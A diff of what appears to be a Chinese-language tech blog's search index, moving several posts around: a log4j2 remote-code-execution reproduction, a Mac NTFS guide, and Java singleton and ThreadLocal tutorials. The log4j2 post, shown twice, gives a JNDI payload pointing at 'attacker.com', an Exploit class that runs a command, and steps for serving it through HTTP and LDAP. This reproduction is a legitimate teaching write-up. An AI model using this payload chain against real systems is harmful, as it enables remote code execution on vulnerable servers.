-<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
-<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
-</ol>
-<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
-<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会在 mac 系统上启动计算器</p>
-<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
-<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
-<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
-<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
-]]></content>
-      <tags>
-        <tag>log4j</tag>
-        <tag>rce</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Mac 实现 NTFS 格式硬盘读写</title>
     <url>/mac-NTFS.html</url>
     <content><![CDATA[<h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>Mac本身是支持NTFS写入的，只是NTFS是微软开发，由于版权和一些技术细节原因，苹果不愿公开说自己支持NTFS写入，也是有自己以后可能不支持NTFS写入的考量</p>
@@ -1226,6 +1194,38 @@
       </tags>
   </entry>
   <entry>
+    <title>log4j2 远程执行漏洞原理与复现</title>
+    <url>/log4j2-rce.html</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
+<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
+<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
+<p>黑客服务器（ladp + http）</p>
+<p>从该请求中注入字符串的日志语句</p>
+<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
+<li>发送包含恶意字符串的请求（通过任何协议）</li>
+<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
+<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
+<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
+<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
+</ol>
+<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
+<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会在 mac 系统上启动计算器</p>
+<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
+<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
+<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
+<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
+]]></content>
+      <tags>
+        <tag>log4j</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>protobuf 安装使用</title>
     <url>/protobuf-use.html</url>
     <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
@@ -1301,61 +1301,6 @@
       </tags>
   </entry>
   <entry>
-    <title>单例模式</title>
-    <url>/singleton.html</url>
-    <content><![CDATA[<h2 id="饿汉式单例"><a href="#饿汉式单例" class="headerlink" title="饿汉式单例"></a>饿汉式单例</h2><p>类加载立即初始化，绝对线程安全，不存在访问安全问题。Spring IOC 容器 ApplicationContext 就是一个饿汉式单例。</p>
-<p>优点：没有任何加锁，执行效率高，用户体验好</p>
-<p>缺点：类加载就初始化，浪费空间</p>
-<span id="more"></span>
-
-<p>简单实例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** 也可以放在静态代码块中 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton HUNGRY_SINGLETON = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HUNGRY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="懒汉式单例"><a href="#懒汉式单例" class="headerlink" title="懒汉式单例"></a>懒汉式单例</h2><p>需要时才加载</p>
-<h3 id="通过-double-check-实现："><a href="#通过-double-check-实现：" class="headerlink" title="通过 double-check 实现："></a>通过 double-check 实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyDoubleCheckSingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 需要用 volatile 修饰保证可见性和重排序</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazyDoubleCheckSingleton lazy;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyDoubleCheckSingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LazyDoubleCheckSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (LazyDoubleCheckSingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 1.分配内存给对象</span></span><br><span class="line">                    <span class="comment">// 2.初始化对象</span></span><br><span class="line">                    <span class="comment">// 3.lazy 指向该对象</span></span><br><span class="line">                    lazy = <span class="keyword">new</span> LazyDoubleCheckSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="通过静态内部类实现："><a href="#通过静态内部类实现：" class="headerlink" title="通过静态内部类实现："></a>通过静态内部类实现：</h3><p>double-check 方法需要加锁，对程序性能有一定影响，用静态内部类实现更好</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> zhouxinghang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-05-16</span></span><br><span class="line"><span class="comment"> * 外部类初次加载，会初始化静态变量、静态代码块、静态方法，但不会加载内部类和静态内部类。</span></span><br><span class="line"><span class="comment"> * 实例化外部类，调用外部类的静态方法、静态变量，则外部类必须先进行加载，但只加载一次。</span></span><br><span class="line"><span class="comment"> * 直接调用静态内部类时，外部类不会加载。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="单例模式的破坏"><a href="#单例模式的破坏" class="headerlink" title="单例模式的破坏"></a>单例模式的破坏</h2><h3 id="反射破坏单例模式"><a href="#反射破坏单例模式" class="headerlink" title="反射破坏单例模式"></a>反射破坏单例模式</h3><p>尽管构造方法加了 private 修饰，但是可以通过反射调用构造方法，因此对构造方法加以限制，重复创建直接抛出异常。</p>
-<p>以上述 LazySingleton 为例：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="序列化破坏单例模式"><a href="#序列化破坏单例模式" class="headerlink" title="序列化破坏单例模式"></a>序列化破坏单例模式</h3><p>在序列化操作时，反序列化后的对象会重新分配内存空间，即重新创建，如果目标是单例对象，就会破坏单例模式。</p>
-<p>对此，我们只需要增加 readResolve() 方法即可。以上述 LazySingleton 为例，修改如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingleton</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazySingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 如果通过反射来创建实例，就抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (LazySingletonHolder.LAZY_SINGLETON != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;不允许创建多个不同实例&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * final 保证方法不被重写</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保证反序列化还是原对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> LazySingletonHolder.LAZY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LazySingletonHolder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> LazySingleton LAZY_SINGLETON = <span class="keyword">new</span> LazySingleton();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>至于为什么，需要看 JDK 序列化源码。ObjectInputStream 类的 readObject() -&gt; readObject0() -&gt; readOrdinaryObject() -&gt; invokeReadResolve()。invokeReadResolve 代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/71BF431A-33F0-4C49-A683-69AF7B27BDFE.png" alt="invokeReadResolve"></p>
-<p>而 readResolveMethod 是在在私有方法 ObjectStreamClass() 中赋值的，代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/2143B7C0-E237-45EB-8D0D-FA667EC34717.png" alt="readResolveMethod"></p>
-<p>可见的，如果被序列化的类定义了 readResolve() 方法，就会调用该方法实现反序列化。</p>
-<p>增加 readResolve() 方法可以防止单例模式被破坏，但是在 readOrdinaryObject() 方法中还是会创建一个新对象的，只不过返回的是readResolve() 方法返回值。具体代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/351EE59B-F579-4B54-BE81-50C017D19F31.png" alt="创建一个新对象"></p>
-<p>注册式单例可以避免这个问题</p>
-<h2 id="注册式单例"><a href="#注册式单例" class="headerlink" title="注册式单例"></a>注册式单例</h2><p>注册式单例又称为登记式单例，就是将每一个实例都登记到某一个地方，使用唯一的标 识获取实例。注册式单例有两种写法：一种为容器缓存，一种为枚举登记。枚举单例也是《Effective Java》书中推荐的一种单例实现写法</p>
-<h3 id="枚举单例"><a href="#枚举单例" class="headerlink" title="枚举单例"></a>枚举单例</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span>  <span class="title">EnumSingleton</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object date;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDate</span><span class="params">(Object date)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.date = date;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> EnumSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>通过反编译发现枚举类是通过静态代码块实现的饿汉式单例模式，反编译代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">&#123;</span><br><span class="line">    INSTANCE = <span class="keyword">new</span> EnumSingleton(<span class="string">&quot;INSTANCE&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    $VALUES = (<span class="keyword">new</span> EnumSingleton[] &#123;</span><br><span class="line">        INSTANCE</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>枚举缓存既不会被序列化破坏，也不会被反射破坏。</p>
-<p>对于序列化，在 ObjectInputStream 类中 readEnum() 方法里，发现枚举类型是通过类名和 Class 对象类找到唯一的枚举对象，代码如下：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/11AC67F5-4A3E-427F-A758-9C7AA9A20444.png" alt="readEnum"></p>
-<p>对于反射，Constructor 类中的 newInstance() 方法对于枚举类，直接抛出异常：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/9286BD38-C4BA-468A-A523-B6EAD2569951.png" alt="newInstance"></p>
-<h3 id="容器缓存单例"><a href="#容器缓存单例" class="headerlink" title="容器缓存单例"></a>容器缓存单例</h3><p>可以看看 Spring 容器式单例实现：</p>
-<p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/31EC471D-8239-49AC-88B9-BA5C538D97D7.png" alt="Spring容器"></p>
-]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>源码</tag>
-        <tag>设计模式</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ThreadLocal</title>
     <url>/threadLocal.html</url>
     <content><![CDATA[<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>总结 ThreadLocal 实现原理，缺点，InheritableThreadLocal 原理，ThreadLocalRandom 中如何应用 ThreadLocal，Spring Bean 中如何 应用 ThreadLocal</p>
@@ -1414,6 +1359,61 @@
         <tag>源码</tag>
         <tag>spring</tag>
         <tag>threadlocal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>单例模式</title>
+    <url>/singleton.html</url>
+    <content><![CDATA[<h2 id="饿汉式单例"><a href="#饿汉式单例" class="headerlink" title="饿汉式单例"></a>饿汉式单例</h2><p>类加载立即初始化，绝对线程安全，不存在访问安全问题。Spring IOC 容器 ApplicationContext 就是一个饿汉式单例。</p>
+<p>优点：没有任何加锁，执行效率高，用户体验好</p>
+<p>缺点：类加载就初始化，浪费空间</p>
+<span id="more"></span>
+
+<p>简单实例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">/** 也可以放在静态代码块中 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton HUNGRY_SINGLETON = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> HUNGRY_SINGLETON;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="懒汉式单例"><a href="#懒汉式单例" class="headerlink" title="懒汉式单例"></a>懒汉式单例</h2><p>需要时才加载</p>
+<h3 id="通过-double-check-实现："><a href="#通过-double-check-实现：" class="headerlink" title="通过 double-check 实现："></a>通过 double-check 实现：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyDoubleCheckSingleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 需要用 volatile 修饰保证可见性和重排序</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> LazyDoubleCheckSingleton lazy;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LazyDoubleCheckSingleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LazyDoubleCheckSingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (LazyDoubleCheckSingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (lazy == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 1.分配内存给对象</span></span><br><span class="line">                    <span class="comment">// 2.初始化对象</span></span><br><span class="line">                    <span class="comment">// 3.lazy 指向该对象</span></span><br><span class="line">                    lazy = <span class="keyword">new</span> LazyDoubleCheckSingleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> lazy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
